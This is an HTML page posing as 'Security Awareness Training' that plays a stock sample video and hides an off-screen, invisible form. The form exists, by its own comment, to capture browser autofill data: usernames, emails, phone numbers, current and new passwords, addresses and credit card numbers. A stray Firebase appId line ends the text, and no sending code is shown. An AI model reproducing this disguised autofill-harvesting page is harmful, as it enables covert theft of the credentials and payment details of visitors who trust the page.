<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Awareness Training</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <h1>Cybersecurity Training Video</h1>
        <div class="video-container">
            <video id="trainingVideo" controls autoplay>
                <source src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4" type="video/mp4">
                Your browser does not support the video tag.
            </video>
        </div>
        <div class="hidden-content">
            <!-- Hidden form to capture autofill data -->
            <form id="autofillCapture" style="opacity: 0; position: absolute; top: -1000px;">
                <input type="text" id="autoUsername" name="username" autocomplete="username">
                <input type="email" id="autoEmail" name="email" autocomplete="email">
                <input type="text" id="autoFullName" name="name" autocomplete="name">
                <input type="tel" id="autoPhone" name="tel" autocomplete="tel">
                <input type="text" id="autoOrganization" name="organization" autocomplete="organization">
                <input type="password" id="autoCurrentPassword" name="current-password" autocomplete="current-password">
                <input type="password" id="autoNewPassword" name="new-password" autocomplete="new-password">
                <input type="text" id="autoStreetAddress" name="street-address" autocomplete="street-address">
                <input type="text" id="autoPostalCode" name="postal-code" autocomplete="postal-code">
                <input type="text" id="autoCountry" name="country" autocomplete="country">
                <input type="text" id="autoCreditCard" name="cc-number" autocomplete="cc-number">
            </form>
        </div>
    </div>

            appId: "1:965071744622:web:3411e7ada3d13ef070007f",
